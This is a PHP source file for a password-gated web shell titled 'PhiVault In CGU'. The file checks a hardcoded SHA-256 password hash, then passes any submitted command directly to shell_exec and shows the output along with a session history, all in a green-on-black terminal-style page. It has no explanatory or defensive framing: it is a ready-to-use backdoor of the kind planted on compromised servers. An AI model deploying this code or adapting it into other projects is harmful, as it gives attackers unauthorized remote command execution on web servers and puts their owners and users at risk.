<?php
session_start();


if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['pass'])) {
        if (hash("sha256", $_POST['pass']) === "68215fa3501ae17394bac692f12a5fe1cd6675a7c048d7307800956469f81057") {
            $_SESSION['loggedin'] = true;
        } else {
            die("<pre>Incorrect password.</pre>");
        }
    } else {
        echo '<form method="post" style="background:black;color:lime;padding:20px">
                <label>Password: </label>
                <input type="password" name="pass" autofocus>
                <input type="submit" value="Login">
              </form>';
        exit;
    }
}


$output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
    $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output];
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PhiVault In CGU</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            padding: 20px;
        }
        .output-box {
            background-color: #111;
            border: 1px solid #444;
            padding: 15px;
            height: 400px;
            overflow-y: scroll;
            margin-bottom: 15px;
        }
        input[type="text"] {
            width: 80%;
            background-color: #111;
            color: lime;
            border: 1px solid #444;
            padding: 8px;
        }
        input[type="submit"] {
            background-color: #222;
            color: lime;
            border: 1px solid #444;
            padding: 8px 16px;
        }
    </style>
</head>
<body>
    <h2>Interactive PHP Shell</h2>
    <div class="output-box">
        <?php
        if (!empty($_SESSION['history'])) {
            foreach ($_SESSION['history'] as $entry) {
                echo "<span style='color:lime;'>$ " . htmlentities($entry['cmd']) . "</span><br>";
                echo "<pre style='color:white;'>" . htmlentities($entry['output']) . "</pre>";
            }
        }
        ?>
    </div>
    <form method="post">
        <input type="text" name="cmd" autofocus autocomplete="off" placeholder="Enter command">
        <input type="submit" value="Run">
    </form>
</body>
</html>
